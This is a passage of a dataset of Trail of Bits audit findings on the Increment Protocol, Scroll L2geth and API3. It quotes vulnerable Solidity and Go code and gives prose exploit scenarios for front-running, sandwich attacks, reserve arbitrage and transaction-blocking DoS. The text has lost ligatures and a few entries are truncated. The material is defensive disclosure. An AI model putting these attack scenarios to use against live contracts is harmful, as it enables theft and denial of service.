Vault_ExcessiveCollateralWeight(); [...] } Figure 2.2: A snippet of the changeCollateralWeight function in Vault.sol#L254-259 If the weight of a collateral asset were mistakenly set to less than 10%, the value of that collateral would decrease, thereby increasing the likelihood of seizures of non-UA collateral. Exploit Scenario Alice, who holds the governance role, decides to update the weight of a collateral asset in response to volatile market conditions. By mistake, Alice sets the weight of the collateral to 1% instead of 10%. As a result of this change, Bobs non-UA collateral assets decrease in value and are seized. Recommendations Short term, change the lower bound on newWeight in the changeCollateralWeight function from 1e16 to 1e17 . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "The Increment Protocol contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. Security issues due to optimization bugs have occurred in the past . A medium- to high-severity bug in the Yul optimizer was introduced in Solidity version 0.8.13 and was xed only recently, in Solidity version 0.8.17 . Another medium-severity optimization bugone that caused memory writes in inline assembly blocks to be removed under certain conditions was patched in Solidity 0.8.15. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the Increment Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Support for multiple reserve tokens allows for arbitrage ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "Because the UA token contract supports multiple reserve tokens, it can be used to swap one reserve token for another at a ratio of 1:1. This creates an arbitrage opportunity, as it enables users to swap reserve tokens with dierent prices. Users can deposit supported reserve tokens in the UA contract in exchange for UA tokens at a 1:1 ratio (gure 4.1). function mintWithReserve ( uint256 tokenIdx , uint256 amount ) external override { // Check that the reserve token is supported if (tokenIdx > reserveTokens.length - 1 ) revert UA_InvalidReserveTokenIndex(); ReserveToken memory reserveToken = reserveTokens[tokenIdx]; // Check that the cap of the reserve token isn't reached uint256 wadAmount = LibReserve.tokenToWad(reserveToken.asset.decimals(), amount); if (reserveToken.currentReserves + wadAmount > reserveToken.mintCap) revert UA_ExcessiveTokenMintCapReached(); _mint( msg.sender , wadAmount); reserveTokens[tokenIdx].currentReserves += wadAmount; reserveToken.asset.safeTransferFrom( msg.sender , address ( this ), amount); } Figure 4.1: The mintWithReserve function in UA.sol#L38-51 Similarly, users can withdraw the amount of a deposit by returning their UA in exchange for any supported reserve token, also at a 1:1 ratio (gure 4.2). function withdraw ( uint256 tokenIdx , uint256 amount ) external override { // Check that the reserve token is supported if (tokenIdx > reserveTokens.length - 1 ) revert UA_InvalidReserveTokenIndex(); IERC20Metadata reserveTokenAsset = reserveTokens[tokenIdx].asset; _burn( msg.sender , amount); reserveTokens[tokenIdx].currentReserves -= amount; uint256 tokenAmount = LibReserve.wadToToken(reserveTokenAsset.decimals(), amount); reserveTokenAsset.safeTransfer( msg.sender , tokenAmount); } Figure 4.2: The withdraw function in UA.sol#L56-66 Thus, a user could mint UA by depositing a less valuable reserve token and then withdraw the same amount of a more valuable token in one transaction, engaging in arbitrage. Exploit Scenario Alice, who holds the governance role, adds USDC and DAI as reserve tokens. Eve notices that DAI is trading at USD 0.99, while USDC is trading at USD 1.00. Thus, she decides to mint a large amount of UA by depositing DAI and to subsequently return the DAI and withdraw USDC, allowing her to make a risk-free prot. Recommendations Short term, document all front-running and arbitrage opportunities in the protocol to ensure that users are aware of them. As development continues, reassess the risks associated with those opportunities and evaluate whether they could adversely aect the protocol . Long term, implement an o-chain monitoring solution (like that detailed in TOB-INC-13 ) to detect any anomalous uctuations in the prices of supported reserve tokens. Additionally, develop an incident response plan to ensure that any issues that arise can be addressed promptly and without confusion. (See appendix D for additional details on creating an incident response plan.)",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Ownership transfers can be front-run ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "The PerpOwnable contract provides an access control mechanism for the minting and burning of a Perpetual contracts vBase or vQuote tokens. The owner of these token contracts is set via the transferPerpOwner function, which assigns the owners address to the perp state variable. This function is designed to be called only once, during deployment, to set the Perpetual contract as the owner of the tokens. Then, as the tokens owner, the Perpetual contract can mint / burn tokens during liquidity provisions, trades, and liquidations. However, because the function is external, anyone can call it to set his or her own malicious address as perp , taking ownership of a contracts vBase or vQuote tokens. function transferPerpOwner ( address recipient ) external { if (recipient == address ( 0 )) revert PerpOwnable_TransferZeroAddress(); if (perp != address ( 0 )) revert PerpOwnable_OwnershipAlreadyClaimed(); perp = recipient; emit PerpOwnerTransferred( msg.sender , recipient); } Figure 5.1: The transferPerpOwner function in PerpOwnable.sol#L29-L35 If the call were front-run, the Perpetual contract would not own the vBase or vQuote tokens, and any attempts to mint / burn tokens would revert. Since all user interactions require the minting or burning of tokens, no liquidity provisions, trades, or liquidations would be possible; the market would be eectively unusable. An attacker could launch such an attack upon every perpetual market deployment to cause a denial of service (DoS). Exploit Scenario Alice, an admin of the Increment Protocol, deploys a new Perpetual contract. Alice then attempts to call transferPerpOwner to set perp to the address of the deployed contract. However, Eve, an attacker monitoring the mempool, sees Alices call to transferPerpOwner and calls the function with a higher gas price. As a result, Eve gains ownership of the virtual tokens and renders the perpetual market useless. Eve then repeats the process with each subsequent deployment of a perpetual market, executing a DoS attack. Recommendations Short term, move all functionality from the PerpOwnable contract to the Perpetual contract. Then add the hasRole modier to the transferPerpOwner function so that the function can be called only by the manager or governance role. Long term, document all cases in which front-running may be possible, along with the implications of front-running for the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Funding payments are made in the wrong token ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "The funding payments owed to users are made in vBase instead of UA tokens; this results in incorrect calculations of users prot-and-loss (PnL) values, an increased risk of liquidations, and a delay in the convergence of a Perpetual contracts value with that of the underlying base asset. When the protocol executes a trade or liquidity provision, one of its rst steps is settling the funding payments that are due to the calling user. To do that, it calls the _settleUserFundingPayments function in the ClearingHouse contract (gure 6.1). The function sums the funding payments due to the user (as a trader and / or a liquidity provider) across all perpetual markets. Once the function has determined the nal funding payment due to the user ( fundingPayments ), the Vault contracts settlePnL function changes the UA balance of the user. function _settleUserFundingPayments( address account) internal { int256 fundingPayments; uint256 numMarkets = getNumMarkets(); for ( uint256 i = 0 ; i < numMarkets; ) { fundingPayments += perpetuals[i].settleTrader(account) + perpetuals[i].settleLp(account); unchecked { ++i; } } if (fundingPayments != 0 ) { vault.settlePnL(account, fundingPayments); } } Figure 6.1: The _settleUserFundingPayments function in ClearingHouse.sol#L637- Both the Perpetual.settleTrader and Perpetual.settleLp functions internally call _getFundingPayments to calculate the funding payment due to the user for a given market (gure 6.2). function _getFundingPayments( bool isLong, int256 userCumFundingRate, int256 globalCumFundingRate, int256 vBaseAmountToSettle ) internal pure returns ( int256 upcomingFundingPayment) { [...] if (userCumFundingRate != globalCumFundingRate) { int256 upcomingFundingRate = isLong ? userCumFundingRate - globalCumFundingRate : globalCumFundingRate - userCumFundingRate; // fundingPayments = fundingRate * vBaseAmountToSettle upcomingFundingPayment = upcomingFundingRate.wadMul(vBaseAmountToSettle); } } Figure 6.2: The _getFundingPayments function in Perpetual.sol#L1152-1173 However, the upcomingFundingPayment value is expressed in vBase, since it is the product of a percentage, which is unitless, and a vBase token amount, vBaseAmountToSettle . Thus, the fundingPayments value that is calculated in _settleUserFundingPayments is also expressed in vBase. However, the settlePnL function internally updates the users balance of UA, not vBase. As a result, the users UA balance will be incorrect, since the users prot or loss may be signicantly higher or lower than it should be. This discrepancy is a function of the price dierence between the vBase and UA tokens. The use of vBase tokens for funding payments causes three issues. First, when withdrawing UA tokens, the user may lose or gain much more than expected. Second, since the UA balance aects the users collateral reserve total, the balance update may increase or decrease the users risk of liquidation. Finally, since funding payments are not made in the notional asset, the convergence between the mark and index prices may be delayed. Exploit Scenario The BTC / USD perpetual markets mark price is signicantly higher than the index price. Alice, who holds a short position, decides to exit the market. However, the protocol calculates her funding payments in BTC and does not convert them to their UA equivalents before updating her balance. Thus, Alice makes much less than expected. Recommendations Short term, use the vBase.indexPrice() function to convert vBase token amounts to UA before the call to vault.settlePnL . Long term, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Excessive dust collection may lead to premature closures of long positions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "The upper bound on the amount of funds considered dust by the protocol may lead to the premature closure of long positions. The protocol collects dust to encourage complete closures instead of closures that leave a position with a small balance of vBase. One place that dust collection occurs is the Perpetual contracts _reducePositionOnMarket function (gure 7.1). function _reducePositionOnMarket ( LibPerpetual.TraderPosition memory user, bool isLong , uint256 proposedAmount , uint256 minAmount ) internal returns ( int256 baseProceeds , int256 quoteProceeds , int256 addedOpenNotional , int256 pnl ) { int256 positionSize = int256 (user.positionSize); uint256 bought ; uint256 feePer ; if (isLong) { quoteProceeds = -(proposedAmount.toInt256()); (bought, feePer) = _quoteForBase(proposedAmount, minAmount); baseProceeds = bought.toInt256(); } else { (bought, feePer) = _baseForQuote(proposedAmount, minAmount); quoteProceeds = bought.toInt256(); baseProceeds = -(proposedAmount.toInt256()); } int256 netPositionSize = baseProceeds + positionSize; if (netPositionSize > 0 && netPositionSize <= 1e17) { _donate(netPositionSize.toUint256()); baseProceeds -= netPositionSize; } [...] } Figure 7.1: The _reducePositionOnMarket function in Perpetual.sol#L876-921 If netPositionSize , which represents a users position after its reduction, is between 0 and 1e17 (1/10 of an 18-decimal token), the system will treat the position as closed and donate the dust to the insurance protocol. This will occur regardless of whether the user intended to reduce, rather than fully close, the position. (Note that netPositionSize is positive if the overall position is long. The dust collection mechanism used for short positions is discussed in TOB-INC-11 .) However, if netPositionSize is tracking a high-value token, the donation to Insurance will no longer be insignicant; 1/10 of 1 vBTC, for instance, would be worth ~USD 2,000 (at the time of writing). Thus, the donation of a users vBTC dust (and the resultant closure of the vBTC position) could prevent the user from proting o of a ~USD 2,000 position. Exploit Scenario Alice, who holds a long position in the vBTC / vUSD market, decides to close most of her position. After the swap, netPositionSize is slightly less than 1e17. Since a leftover balance of that amount is considered dust (unbeknownst to Alice), her ~1e17 vBTC tokens are sent to the Insurance contract, and her position is fully closed. Recommendations Short term, have the protocol calculate the notional value of netPositionSize by multiplying it by the return value of the indexPrice function. Then have it compare that notional value to the dust thresholds. Note that the dust thresholds must also be expressed in the notional token and that the comparison should not lead to a signicant decrease in a users position. Long term, document this system edge case to inform users that a fraction of their long positions may be donated to the Insurance contract after being reduced.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Problematic use of primitive operations on xed-point integers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "The protocols use of primitive operations over xed-point signed and unsigned integers increases the risk of overows and undened behavior. The Increment Protocol uses the PRBMathSD59x18 and PRBMathUD60x18 math libraries to perform operations over 59x18 signed integers and 60x18 unsigned integers, respectively (specically to perform multiplication and division and to nd their absolute values). These libraries aid in calculations that involve percentages or ratios or require decimal precision. When a smart contract system relies on primitive integers and xed-point ones, it should avoid arithmetic operations that involve the use of both types. For example, using x.wadMul(y) to multiply two xed-point integers will provide a dierent result than using x * y . For that reason, great care must be taken to dierentiate between variables that are xed-point and those that are not. Calculations involving xed-point values should use the provided library operations; calculations involving both xed-point and primitive integers should be avoided unless one type is converted to the other. However, a number of multiplication and division operations in the codebase use both primitive and xed-point integers. These include those used to calculate the new time-weighted average prices (TWAPs) of index and market prices (gure 8.1). function _updateTwap () internal { uint256 currentTime = block.timestamp ; int256 timeElapsed = (currentTime - globalPosition.timeOfLastTrade).toInt256(); /* */ priceCumulative1 = priceCumulative0 + price1 * timeElapsed // will overflow in ~3000 years // update cumulative chainlink price feed int256 latestChainlinkPrice = indexPrice(); oracleCumulativeAmount += latestChainlinkPrice * timeElapsed ; // update cumulative market price feed int256 latestMarketPrice = marketPrice().toInt256(); marketCumulativeAmount += latestMarketPrice * timeElapsed ; uint256 timeElapsedSinceBeginningOfPeriod = block.timestamp - globalPosition.timeOfLastTwapUpdate; if (timeElapsedSinceBeginningOfPeriod >= twapFrequency) { /* */ TWAP = (priceCumulative1 - priceCumulative0) / timeElapsed // calculate chainlink twap oracleTwap = ((oracleCumulativeAmount - oracleCumulativeAmountAtBeginningOfPeriod) / timeElapsedSinceBeginningOfPeriod.toInt256()).toInt128() ; // calculate market twap marketTwap = ((marketCumulativeAmount - marketCumulativeAmountAtBeginningOfPeriod) / timeElapsedSinceBeginningOfPeriod.toInt256()).toInt128() ; // reset cumulative amount and timestamp oracleCumulativeAmountAtBeginningOfPeriod = oracleCumulativeAmount; marketCumulativeAmountAtBeginningOfPeriod = marketCumulativeAmount; globalPosition.timeOfLastTwapUpdate = block.timestamp .toUint64(); emit TwapUpdated(oracleTwap, marketTwap); } } Figure 8.1: The _updateTwap function in Perpetual.sol#L1071-1110 Similarly, the _getUnrealizedPnL function in the Perpetual contract calculates the tradingFees value by multiplying a primitive and a xed-point integer (gure 8.2). function _getUnrealizedPnL(LibPerpetual.TraderPosition memory trader) internal view returns ( int256 ) { int256 oraclePrice = indexPrice(); int256 vQuoteVirtualProceeds = int256 (trader.positionSize).wadMul(oraclePrice); int256 tradingFees = (vQuoteVirtualProceeds.abs() * market.out_fee().toInt256()) / CURVE_TRADING_FEE_PRECISION; // @dev: take upper bound on the trading fees // in the case of a LONG, trader.openNotional is negative but vQuoteVirtualProceeds is positive // in the case of a SHORT, trader.openNotional is positive while vQuoteVirtualProceeds is negative return int256 (trader.openNotional) + vQuoteVirtualProceeds - tradingFees; } Figure 8.2: The _getUnrealizedPnL function in Perpetual.sol#L1175-1183 These calculations can lead to unexpected overows or cause the system to enter an undened state. Note that there are other such calculations in the codebase that are not documented in this nding. Recommendations Short term, identify all state variables that are xed-point signed or unsigned integers. Additionally, ensure that all multiplication and division operations involving those state variables use the wadMul and wadDiv functions, respectively. If the Increment Finance team decides against using wadMul or wadDiv in any of those operations (whether to optimize gas or for another reason), it should provide inline documentation explaining that decision.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Liquidations are vulnerable to sandwich attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "Token swaps that are performed to liquidate a position use a hard-coded zero as the minimum-amount-out value, making them vulnerable to sandwich attacks. The minimum-amount-out value indicates the minimum amount of tokens that a user will receive from a swap. The value is meant to provide protection against pool illiquidity and sandwich attacks. Senders of position and liquidity provision updates are allowed to specify a minimum amount out. However, the minimum-amount-out value used in liquidations of both traders and liquidity providers positions is hard-coded to zero. Figures 9.1 and 9.2 show the functions that perform these liquidations ( _liquidateTrader and _liquidateLp , respectively). function _liquidateTrader( uint256 idx, address liquidatee, uint256 proposedAmount ) internal returns ( int256 pnL, int256 positiveOpenNotional) { (positiveOpenNotional) = int256 (_getTraderPosition(idx, liquidatee).openNotional).abs(); LibPerpetual.Side closeDirection = _getTraderPosition(idx, liquidatee).positionSize >= 0 ? LibPerpetual.Side.Short : LibPerpetual.Side.Long; // (liquidatee, proposedAmount) (, , pnL, ) = perpetuals[idx].changePosition(liquidatee, proposedAmount, 0 , closeDirection, true ); // traders are allowed to reduce their positions partially, but liquidators have to close positions in full if (perpetuals[idx].isTraderPositionOpen(liquidatee)) revert ClearingHouse_LiquidateInsufficientProposedAmount(); return (pnL, positiveOpenNotional); } Figure 9.1: The _liquidateTrader function in ClearingHouse.sol#L522-541 function _liquidateLp ( uint256 idx , address liquidatee , uint256 proposedAmount ) internal returns ( int256 pnL , int256 positiveOpenNotional ) { positiveOpenNotional = _getLpOpenNotional(idx, liquidatee).abs(); // close lp (pnL, , ) = perpetuals[idx].removeLiquidity( liquidatee, _getLpLiquidity(idx, liquidatee), [ uint256 ( 0 ), uint256 ( 0 )] , proposedAmount, 0 , true ); _distributeLpRewards(idx, liquidatee); return (pnL, positiveOpenNotional); } Figure 9.2: The _liquidateLp function in ClearingHouse.sol#L543-562 Without the ability to set a minimum amount out, liquidators are not guaranteed to receive any tokens from the pool during a swap. If a liquidator does not receive the correct amount of tokens, he or she will be unable to close the position, and the transaction will revert; the revert will also prolong the Increment Protocols exposure to debt. Moreover, liquidators will be discouraged from participating in liquidations if they know that they may be subject to sandwich attacks and may lose money in the process. Exploit Scenario Alice, a liquidator, notices that a position is no longer valid and decides to liquidate it. When she sends the transaction, the protocol sets the minimum-amount-out value to zero. Eves sandwich bot identies Alices liquidation as a pure prot opportunity and sandwiches it with transactions. Alices liquidation fails, and the protocol remains in a state of debt. Recommendations Short term, allow liquidators to specify a minimum-amount-out value when liquidating the positions of traders and liquidity providers. Long term, document all cases in which front-running may be possible, along with the implications of front-running for the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Accuracy of market and oracle TWAPs is tied to the frequency of user interactions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "The oracle and market TWAPs can be updated only during traders and liquidity providers interactions with the protocol; a downtick in user interactions will result in less accurate TWAPs that are more susceptible to manipulation. The accuracy of a TWAP is related to the number of data points available for the average price calculation. The less often prices are logged, the less robust the TWAP becomes. In the case of the Increment Protocol, a TWAP can be updated with each block that contains a trader or liquidity provider interaction. However, during a market slump (i.e., a time of reduced network trac), there will be fewer user interactions and thus fewer price updates. TWAP updates are performed by the Perpetual._updateTwap function, which is called by the internal Perpetual._updateGlobalState function. Other protocols, though, take a dierent approach to keeping markets up to date. The Compound Protocol, for example, has an accrueInterest function that is called upon every user interaction but is also a standalone public function that anyone can call. Recommendations Short term, create a public updateGlobalState function that anyone can call to internally call _updateGlobalState . Long term, create an o-chain worker that can alert the team to periods of perpetual market inactivity, ensuring that the team knows to update the market accordingly. 11. Liquidations of short positions may fail because of insu\u0000cient dust collection Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-INC-11 Target: contracts/Perpetual.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "Although dependency scans did not identify a direct threat to the project under review, yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repository under review. The output below details the high-severity vulnerabilities: CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Risks associated with oracle outages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "Under extreme market conditions, the Chainlink oracle may cease to work as expected, causing unexpected behavior in the Increment Protocol. Such oracle issues have occurred in the past. For example, during the LUNA market crash, the Venus protocol was exploited because Chainlink stopped providing up-to-date prices. The interruption occurred because the price of LUNA dropped below the minimum price ( minAnswer ) allowed by the LUNA / USD price feed on the BNB chain. As a result, all oracle updates reverted. Chainlinks automatic circuit breakers , which pause price feeds during extreme market conditions, could pose similar problems. Note that these kinds of events cannot be tracked on-chain. If a price feed is paused, updatedAt will still be greater than zero, and answeredInRound will still be equal to roundID . Thus, the Increment Finance team should implement an o-chain monitoring solution to detect any anomalous behavior exhibited by Chainlink oracles. The monitoring solution should check for the following conditions and issue alerts if they occur, as they may be indicative of abnormal market events:    An asset price that is approaching the minAnswer or maxAnswer value The suspension of a price feed by an automatic circuit breaker Any large deviations in the price of an asset References    Chainlink: Risk Mitigation Chainlink: Monitoring Data Feeds Chainlink: Circuit Breakers",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Attacker can prevent L2 transactions from being added to a block ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-securityreview.pdf",
        "body": "The commitTransactions function returns a ag that determines whether to halt transaction production, even if the block has room for more transactions to be added. If the circuit checker returns an error either for row consumption being too high or reasons unknown, the circuitCapacityReached ag is set to true (gure 1.1). case (errors.Is(err, circuitcapacitychecker.ErrTxRowConsumptionOverflow) && tx.IsL1MessageTx()): // Circuit capacity check: L1MessageTx row consumption too high, shift to the next from the account, // because we shouldn't skip the entire txs from the same account. // This is also useful for skipping \"problematic\" L1MessageTxs. queueIndex := tx.AsL1MessageTx().QueueIndex log.Trace(\"Circuit capacity limit reached for a single tx\", \"tx\", tx.Hash().String(), \"queueIndex\", queueIndex) log.Info(\"Skipping L1 message\", \"queueIndex\", queueIndex, \"tx\", tx.Hash().String(), \"block\", w.current.header.Number, \"reason\", \"row consumption overflow\") w.current.nextL1MsgIndex = queueIndex + 1 // after `ErrTxRowConsumptionOverflow`, ccc might not revert updates // associated with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Shift()` circuitCapacityReached = true break loop case (errors.Is(err, circuitcapacitychecker.ErrTxRowConsumptionOverflow) && !tx.IsL1MessageTx()): // Circuit capacity check: L2MessageTx row consumption too high, skip the account. // This is also useful for skipping \"problematic\" L2MessageTxs. log.Trace(\"Circuit capacity limit reached for a single tx\", \"tx\", tx.Hash().String()) // after `ErrTxRowConsumptionOverflow`, ccc might not revert updates // associated with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Pop()` circuitCapacityReached = true break loop case (errors.Is(err, circuitcapacitychecker.ErrUnknown) && tx.IsL1MessageTx()): // Circuit capacity check: unknown circuit capacity checker error for L1MessageTx, // shift to the next from the account because we shouldn't skip the entire txs from the same account queueIndex := tx.AsL1MessageTx().QueueIndex log.Trace(\"Unknown circuit capacity checker error for L1MessageTx\", \"tx\", tx.Hash().String(), \"queueIndex\", queueIndex) log.Info(\"Skipping L1 message\", \"queueIndex\", queueIndex, \"tx\", tx.Hash().String(), \"block\", w.current.header.Number, \"reason\", \"unknown row consumption error\") w.current.nextL1MsgIndex = queueIndex + 1 // after `ErrUnknown`, ccc might not revert updates associated // with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Shift()` circuitCapacityReached = true break loop case (errors.Is(err, circuitcapacitychecker.ErrUnknown) && !tx.IsL1MessageTx()): // Circuit capacity check: unknown circuit capacity checker error for L2MessageTx, skip the account log.Trace(\"Unknown circuit capacity checker error for L2MessageTx\", \"tx\", tx.Hash().String()) // after `ErrUnknown`, ccc might not revert updates associated // with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Pop()` circuitCapacityReached = true break loop Figure 1.1: Error handling for the circuit capacity checker (worker.go#L1073-L1121) When this ag is set to true, no new transactions will be added even if there is room for additional transactions in the block (gure 1.2). // Fill the block with all available pending transactions. pending := w.eth.TxPool().Pending(true) // Short circuit if there is no available pending transactions. // But if we disable empty precommit already, ignore it. Since // empty block is necessary to keep the liveness of the network. if len(pending) == 0 && pendingL1Txs == 0 && atomic.LoadUint32(&w.noempty) == 0 { w.updateSnapshot() return } // Split the pending transactions into locals and remotes localTxs, remoteTxs := make(map[common.Address]types.Transactions), pending for _, account := range w.eth.TxPool().Locals() { if txs := remoteTxs[account]; len(txs) > 0 { delete(remoteTxs, account) localTxs[account] = txs } } var skipCommit, circuitCapacityReached bool if w.chainConfig.Scroll.ShouldIncludeL1Messages() && len(l1Txs) > 0 { log.Trace(\"Processing L1 messages for inclusion\", \"count\", pendingL1Txs) txs := types.NewTransactionsByPriceAndNonce(w.current.signer, l1Txs, header.BaseFee) skipCommit, circuitCapacityReached = w.commitTransactions(txs, w.coinbase, interrupt) if skipCommit { return } } if len(localTxs) > 0 && !circuitCapacityReached { txs := types.NewTransactionsByPriceAndNonce(w.current.signer, localTxs, header.BaseFee) skipCommit, circuitCapacityReached = w.commitTransactions(txs, w.coinbase, interrupt) if skipCommit { return } } if len(remoteTxs) > 0 && !circuitCapacityReached { txs := types.NewTransactionsByPriceAndNonce(w.current.signer, remoteTxs, header.BaseFee) // don't need to get `circuitCapacityReached` here because we don't have further `commitTransactions` // after this one, and if we assign it won't take effect (`ineffassign`) skipCommit, _ = w.commitTransactions(txs, w.coinbase, interrupt) if skipCommit { return } } // do not produce empty blocks if w.current.tcount == 0 { return } w.commit(uncles, w.fullTaskHook, true, tstart) Figure 1.2: Pending transactions are not added if the circuit capacity has been reached. (worker.go#L1284-L1332) Exploit Scenario Eve, an attacker, sends an L2 transaction that uses ecrecover many times. The transaction is provided to the mempool with enough gas to be the rst L2 transaction in the blockchain. Because this causes an error in the circuit checker, it prevents all other L2 transactions from being executed in this block. Recommendations Short term, implement a snapshotting mechanism in the circuit checker to roll back unexpected changes made as a result of incorrect or incomplete computation. Long term, analyze and document all impacts of error handling across the system to ensure that these errors are handled gracefully. Additionally, clearly document all expected invariants of how the system is expected to behave to ensure that in interactions with other components, these invariants hold throughout the system.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Unused and dead code ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-securityreview.pdf",
        "body": "Due to the infrastructure setup of this network and the use of a single node clique setup, this fork of geth contains a signicant amount of unused logic. Continuing to maintain this code can be problematic and may lead to issues. The following are examples of unused and dead code:  Uncle blockswith a single node clique network, there is no chance for uncle blocks to exist, so all the logic that handles and interacts with uncle blocks can be dropped.  Redundant logic around updating the L1 queue index  A redundant check on empty blocks in the worker.go le Recommendations Short term, remove anything that is no longer relevant for the current go-etheruem implementation and be sure to document all the changes to the codebase. Long term, remove all unused code from the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "3. Lack of documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-securityreview.pdf",
        "body": "Certain areas of the codebase lack documentation, high-level descriptions, and examples, which makes the contracts dicult to review and increases the likelihood of user mistakes. Areas that would benet from being expanded and claried in code and documentation include the following:  Internals of the CCC. Despite being treated as a black box, the code relies on stateful changes made from geth calls. This suggests that the internal states of the miner's work and the CCC overlap. The lack of documentation regarding these states creates a lack of visibility in evaluating whether there are potential state corruptions or unexpected behavior.  Circumstances where transactions are skipped and how they are expected to be handled. During the course of the review, we attempted to reverse engineer the intended behavior of transactions considered skipped by the CCC. The lack of documentation in these areas results in unclear expectations for this code.  Error handling standard throughout the system. The codebase handles system errors dierentlyin some cases, logging an error and continuing execution or logging traces. Listing out all instances where errors are identied and documenting how they are handled can help ensure that there is no unexpected behavior related to error handling. The documentation should include all expected properties and assumptions relevant to the aforementioned aspects of the codebase. Recommendations Short term, review and properly document the aforementioned aspects of the codebase. In addition to external documentation, NatSpec and inline code comments could help clarify complexities. Long term, consider writing a formal specication of the protocol. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. Publish-subscribe protocol users are vulnerable to a denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "body": "The API3 system implements a publish-subscribe protocol through which a requester can receive a callback from an API when specied conditions are met. These conditions can be hard-coded when the Airnode is congured or stored on-chain. When they are stored on-chain, the user can call storeSubscription to establish other conditions for the callback (by specifying parameters and conditions arguments of type bytes ). The arguments are then used in abi.encodePacked , which could result in a subscriptionId collision. function storeSubscription( [...] bytes calldata parameters, bytes calldata conditions, [...] ) external override returns ( bytes32 subscriptionId) { [...] subscriptionId = keccak256 ( abi .encodePacked( chainId, airnode, templateId, parameters , conditions , relayer, sponsor, requester, fulfillFunctionId ) ); subscriptions[subscriptionId] = Subscription({ chainId: chainId, airnode: airnode, templateId: templateId, parameters: parameters, conditions: conditions, relayer: relayer, sponsor: sponsor, requester: requester, fulfillFunctionId: fulfillFunctionId }); Figure 1.1: StorageUtils.sol#L135-L158 The Solidity documentation includes the following warning: If you use keccak256(abi.encodePacked(a, b)) and both a and b are dynamic types, it is easy to craft collisions in the hash value by moving parts of a into b and vice-versa. More specically, abi.encodePacked(\"a\", \"bc\") == abi.encodePacked(\"ab\", \"c\"). If you use abi.encodePacked for signatures, authentication or data integrity, make sure to always use the same types and check that at most one of them is dynamic. Unless there is a compelling reason, abi.encode should be preferred. Figure 1.2: The Solidity documentation details the risk of a collision caused by the use of abi.encodePacked with more than one dynamic type. Exploit Scenario Alice calls storeSubscription to set the conditions for a callback from a specic API to her smart contract. Eve, the owner of a competitor protocol, calls 